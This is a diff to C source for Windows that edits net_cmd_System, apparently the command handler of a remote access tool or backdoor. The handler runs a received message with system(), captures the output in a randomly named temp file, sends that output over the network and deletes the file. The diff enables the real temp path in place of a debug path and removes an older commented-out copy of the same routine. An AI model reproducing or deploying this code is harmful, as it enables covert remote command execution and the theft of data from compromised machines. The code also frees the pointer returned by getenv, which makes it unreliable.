@@ -10,8 +10,8 @@ int net_cmd_System(char* msg, int msgLen)
 {
 	char* temp_path = getenv("TEMP");
 	int len = strlen(temp_path) + 16;
-	char* buff_path = "testlog";//malloc(len);
-	//snprintf(buff_path, len, "%s\\mKtIXMj52rh7PU", temp_path);
+	char* buff_path = malloc(len);
+	snprintf(buff_path, len, "%s\\mKtIXMj52rh7PU", temp_path);
 
 	PROCESS_INFORMATION pi; 
 	STARTUPINFO si;
@@ -86,56 +86,3 @@ int net_cmd_System(char* msg, int msgLen)
 
 	return 1;
 }
-
-/*
-int net_cmd_System(char* msg, int msgLen)
-{
-	char* temp_path = getenv("TEMP");
-	int len = strlen(temp_path) + 16;
-	char* buff_path = malloc(len);
-	snprintf(buff_path, len, "%s\\mKtIXMj52rh7PU", temp_path);
-	
-	FILE *f = fopen(buff_path, "a+");
-	int savedStdout = dup(1);
-	dup2(_fileno(f), 1);
-
-	system(msg);
-
-	fflush(stdout);
-	dup2(savedStdout, 1);
-	fseek(f, 0, SEEK_SET);
-
-	char buff[100];
-	memset(buff, 0, 100);
-
-	while(fgets(buff, 100, f) != NULL)
-	{
-		if(net_SendData(buff, strlen(buff)) < 1)
-		{
-			fclose(f);
-			remove(buff_path);
-			free(buff_path);
-			free(temp_path);
-
-			return -1;
-		}
-
-		Sleep(5);
-		
-		memset(buff, 0, 100);
-	}
-
-	fclose(f);
-	remove(buff_path);
-	free(buff_path);
-	free(temp_path);
-
-	buff[0] = NET_CMD_SYSTEM;
-	
-	if(net_SendData(buff, 2) < 1)
-	{
-		return -1;
-	}
-
-	return 1;
-}*/
